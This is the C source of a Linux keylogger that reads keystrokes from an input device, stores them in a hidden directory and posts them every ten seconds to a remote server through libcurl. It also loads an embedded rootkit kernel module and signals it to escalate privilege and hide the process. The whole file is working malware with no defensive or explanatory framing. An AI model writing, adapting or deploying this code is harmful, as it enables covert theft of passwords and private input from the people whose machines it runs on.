#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <curl/curl.h>
#include <curl/easy.h>

struct kl_context {
    pthread_mutex_t mutex;
    FILE *device_file;
    FILE *capture_file;
    CURL *curl;
    const char *server_url;
};

const char *EVDEV_PATH_PREFIX = "/dev/input/event";

const char *KL_CAPTURES_DIR_PATH = ".keylogger";
const char *KL_ACTIVE_CAPTURE_FILE_PATH = ".keylogger/capture.active";
const char *KL_PENDING_CAPTURE_FILE_PATH = ".keylogger/capture.pending";

const char *KL_DEFAULT_SERVER_URL = "http://localhost:9200";
const size_t KL_UPLOAD_CHUNK_MAX_LEN = 4096;
const uint16_t KL_UPLOAD_INTERVAL_SECS = 10;

// Contains the ELF image of the rootkit
extern uint8_t _binary_bin_rooti_ko_start[];
extern uint8_t _binary_bin_rooti_ko_end[];


void kl_install_rootkit()
{
    size_t image_size = _binary_bin_rooti_ko_end - _binary_bin_rooti_ko_start;

    int err = syscall(SYS_init_module, _binary_bin_rooti_ko_start, image_size, "");
    if (err) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }
}

bool kl_validate_device_file_type(char * path)
{
    struct stat st;

    int err = stat(path, &st);
    if (err) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }

    if (!S_ISCHR(st.st_mode)) {
        fprintf(stderr, "keylogger: provided file is not a character device file\n");
        return false;
    }

    return true;
}

bool kl_validate_device_file_path(char *path)
{
    char path_buf[PATH_MAX];

    char *real_path = realpath(path, path_buf);
    if (real_path == NULL) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }

    if (strncmp(EVDEV_PATH_PREFIX, real_path, strlen(EVDEV_PATH_PREFIX)) != 0) {
        fprintf(stderr, "keylogger: provided file is not an input device file\n");
        return false;
    }

    return true;
}

void kl_create_captures_dir_if_missing()
{
    int err = mkdir(KL_CAPTURES_DIR_PATH, S_IRWXU);
    if (err && errno != EEXIST) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }
}

void kl_read_keystroke(FILE *device_file, struct input_event *event)
{
    size_t nread;

    do {
        nread = fread(event, sizeof(*event), 1, device_file);
        if (nread < 1 && ferror(device_file)) {
            perror("keylogger");
            exit(EXIT_FAILURE);
        }
    } while (event->type != EV_KEY || event->value == 0);
}

void *kl_capture_keystrokes(void *ctx_raw)
{
    struct kl_context *ctx = ctx_raw;
    struct input_event event;
    size_t nwritten;
    int err;

    while (true) {
        kl_read_keystroke(ctx->device_file, &event);

        pthread_mutex_lock(&ctx->mutex);

        nwritten = fwrite(&event, sizeof(event), 1, ctx->capture_file);
        if (nwritten < 1) {
            perror("keylogger");
            exit(EXIT_FAILURE);
        }

        err = fflush(ctx->capture_file);
        if (err) {
            perror("keylogger");
            exit(EXIT_FAILURE);
        }

        pthread_mutex_unlock(&ctx->mutex);
    }

    return NULL;
}

void kl_rotate_capture_file(struct kl_context *ctx)
{
    int err;

    pthread_mutex_lock(&ctx->mutex);

    fclose(ctx->capture_file);

    err = rename(KL_ACTIVE_CAPTURE_FILE_PATH, KL_PENDING_CAPTURE_FILE_PATH);
    if (err) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }

    ctx->capture_file = fopen(KL_ACTIVE_CAPTURE_FILE_PATH, "a");
    if (err) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }

    pthread_mutex_unlock(&ctx->mutex);
}

void kl_upload_single_capture(struct kl_context *ctx, FILE *capture_file) {
    struct input_event events[KL_UPLOAD_CHUNK_MAX_LEN];
    struct curl_slist *headers = NULL;
    char url[256];
    CURLcode code;
    size_t nread;

    snprintf(url, 256, "%s/capture", ctx->server_url);

    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(ctx->curl, CURLOPT_URL, url);
    curl_easy_setopt(ctx->curl, CURLOPT_HTTPHEADER, headers);

    while ((nread = fread(events, sizeof(struct input_event),
                          KL_UPLOAD_CHUNK_MAX_LEN, capture_file)) > 0) {
        curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDS, events);
        curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDSIZE, nread * sizeof(struct input_event));

        code = curl_easy_perform(ctx->curl);
        if (code != CURLE_OK) {
            exit(EXIT_FAILURE);
            fprintf(stderr, "curl failed: %s\n", curl_easy_strerror(code));
        }
    }

    if (ferror(capture_file)) {
        perror("keylogger");
        exit(EXIT_FAILURE);
    }

    curl_slist_free_all(headers);
}

void *kl_upload_captures(void *ctx_raw)
{
    struct kl_context *ctx = ctx_raw;
    struct stat st;
    FILE *capture_file;
    int err;

    while (true) {
        sleep(KL_UPLOAD_INTERVAL_SECS);

        err = stat(KL_ACTIVE_CAPTURE_FILE_PATH, &st);
        if (err) {
            perror("keylogger");
            exit(EXIT_FAILURE);
        }
        if (st.st_size == 0) {
            continue;
        }

        kl_rotate_capture_file(ctx);

        capture_file = fopen(KL_PENDING_CAPTURE_FILE_PATH, "r");
        if (capture_file == NULL) {
            perror("keylogger");
            exit(EXIT_FAILURE);
        }

        kl_upload_single_capture(ctx, capture_file);
        fclose(capture_file);
        unlink(KL_PENDING_CAPTURE_FILE_PATH);
    }
}

int main(int argc, char **argv)
{
    struct kl_context ctx;
    pthread_t capture_tid;
    pthread_t upload_tid;
    int err;

    if (argc < 2 || argc > 3) {
        fprintf(stderr, "usage: %s DEVICE_FILE [SERVER_URL]\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (!kl_validate_device_file_type(argv[1])||
        !kl_validate_device_file_path(argv[1])) {
            return EXIT_FAILURE;
    }

    kl_create_captures_dir_if_missing();

    kl_install_rootkit();

    // Escalate privilege
    err = kill(1, 64);
    if (err) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    // Hide process
    err = kill(1, 63);
    if (err) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    // Stick to rootkit (makes it unload if this program terminates)
    err = kill(1, 61);
    if (err) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    pthread_mutex_init(&ctx.mutex, NULL);

    curl_global_init(CURL_GLOBAL_DEFAULT);

    ctx.server_url = argc > 2 ? argv[2] : KL_DEFAULT_SERVER_URL;

    ctx.curl = curl_easy_init();
    if (ctx.curl == NULL) {
        fprintf(stderr, "keylogger: failed to initialize curl");
        exit(EXIT_FAILURE);
    }

    ctx.device_file = fopen(argv[1], "r");
    if (ctx.device_file == NULL) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    ctx.capture_file = fopen(KL_ACTIVE_CAPTURE_FILE_PATH, "a");
    if (ctx.capture_file == NULL) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    err = pthread_create(&capture_tid, NULL, kl_capture_keystrokes, &ctx);
    if (err) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    err = pthread_create(&upload_tid, NULL, kl_upload_captures, &ctx);
    if (err) {
        perror("keylogger");
        return EXIT_FAILURE;
    }

    pthread_join(capture_tid, NULL);
    pthread_join(upload_tid, NULL);

    return EXIT_SUCCESS;
}
